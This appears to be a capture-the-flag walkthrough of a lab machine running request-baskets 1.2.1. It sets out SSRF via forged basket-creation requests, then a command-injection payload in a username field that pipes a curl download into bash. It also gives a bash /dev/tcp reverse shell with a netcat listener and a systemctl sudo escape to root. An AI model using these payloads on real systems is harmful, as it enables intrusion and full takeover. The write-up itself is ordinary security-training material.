## Recon

~~~
sudo nmap -sCV 10.10.11.224
~~~

~~~
Nmap scan report for 10.10.11.224
Host is up (0.25s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 08 Jul 2023 20:05:34 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sat, 08 Jul 2023 20:05:04 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sat, 08 Jul 2023 20:05:05 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.93%I=7%D=7/9%Time=64A9C170%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\x
SF:20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Sat,\x2008\x20Jul\x202
SF:023\x2020:05:04\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/we
SF:b\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x2020
SF:0\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Sat,\x2008\x20Jul\x202
SF:023\x2020:05:05\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,
SF:67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")
SF:%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCo
SF:nnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20ch
SF:arset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Ke
SF:rberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options:
SF:\x20nosniff\r\nDate:\x20Sat,\x2008\x20Jul\x202023\x2020:05:34\x20GMT\r\
SF:nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20name
SF:\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\$\n
SF:")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clos
SF:e\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.69 seconds
~~~

Landing Page :

![[Pasted image 20230709022114.png]]

`Powered by [request-baskets](https://github.com/darklynx/request-baskets) | Version: 1.2.1

Found version , Checked for Vulnerabilities...!!!

https://notes.sjtu.edu.cn/s/MUUhEymt7#
Found this ..!!

For that create a basket first ,


At the same time , i have a eye on burpsuite...!!

Can see /api/baskets/basketname

![[Pasted image 20230709022421.png]]

Here i used `fuk1`  as First Basket name..!!!

Sent the POST request to `/api/baskets/fuk1`

Payload :

```
{"forward_url": "http://127.0.0.1:80/","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}
```


~~~
POST /api/baskets/fuk1 HTTP/1.1
Host: 10.10.11.224:55555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: null
X-Requested-With: XMLHttpRequest
Origin: http://10.10.11.224:55555
Connection: close
Referer: http://10.10.11.224:55555/web
Content-Length: 120

{"forward_url": "http://127.0.0.1:80/","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}
~~~



![[Pasted image 20230709022729.png]]

Now create another basket i named it as `fuk2`and sent a POST request to `/api/baskets/fuk2`

`with this payload`

```
{"forward_url": "http://127.0.0.1:80/login","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}
```

~~~
POST /api/baskets/fuk2 HTTP/1.1
Host: 10.10.11.224:55555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: null
X-Requested-With: XMLHttpRequest
Origin: http://10.10.11.224:55555
Connection: close
Referer: http://10.10.11.224:55555/web
Content-Length: 125

{"forward_url": "http://127.0.0.1:80/login","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}
~~~

![[Pasted image 20230709023230.png]]

Now send a POST request to `http://<ip>:55555/fuk2`



with payload

```
username=;`curl <local_ip>/shell | bash`'
```

![[Pasted image 20230709022650.png]]

`shell file`

![[Pasted image 20230709023547.png]]

~~~
bash -i >& /dev/tcp/10.10.14.236/6543 0>&1
~~~

Setup both python server and netcat listener

~~~
sudo python3 -m http.server <PORT>
~~~

~~~
nc -lvnp 6543
~~~

![[Pasted image 20230709023727.png]]

Can see logs, it works


Got shell as `puma

Now got User Flag..!!!

## Root

![[Pasted image 20230709024011.png]]

~~~
sudo -l
~~~

Reference Link : https://gtfobins.github.io/gtfobins/systemctl/#sudo

Got root by just running 

~~~
 /usr/bin/systemctl status trail.service
 !sh
~~~

![[Pasted image 20230709024158.png]]

Got root..!!
